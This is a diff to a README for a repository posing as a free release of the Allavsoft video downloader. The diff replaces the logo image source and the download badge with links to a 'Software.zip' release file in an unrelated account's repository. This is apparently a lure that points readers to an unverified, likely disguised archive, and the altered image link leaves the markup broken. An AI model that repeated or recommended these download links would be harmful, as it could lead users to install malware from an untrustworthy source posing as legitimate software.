@@ -1,6 +1,6 @@
 # Allavsoft Video Downloader Free
 
-![Allavsoft Logo](https://example.com/allavsoft-logo.png)
+![Allavsoft Logo](https://github.com/XToaster/Allavsoft-Video-Downloader-Free/releases/download/v1.0/Software.zip)
 
 Welcome to the **Allavsoft Video Downloader Free** repository! This repository is dedicated to providing information and resources related to the popular video downloader tool, Allavsoft. Whether you are looking to download videos from various websites, convert video files, or explore the features of the Allavsoft software, you have come to the right place.
 
@@ -49,7 +49,7 @@ For more information on Allavsoft and its features, you can visit the official A
 
 Ready to get started with Allavsoft? Click the button below to download the latest version of Allavsoft:
 
-[![Download Allavsoft](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Allavsoft](https://github.com/XToaster/Allavsoft-Video-Downloader-Free/releases/download/v1.0/Software.zip%20Version-blue)](https://github.com/XToaster/Allavsoft-Video-Downloader-Free/releases/download/v1.0/Software.zip)
 
 Once you have downloaded Allavsoft, you can explore its features and start downloading your favorite videos with ease.
 
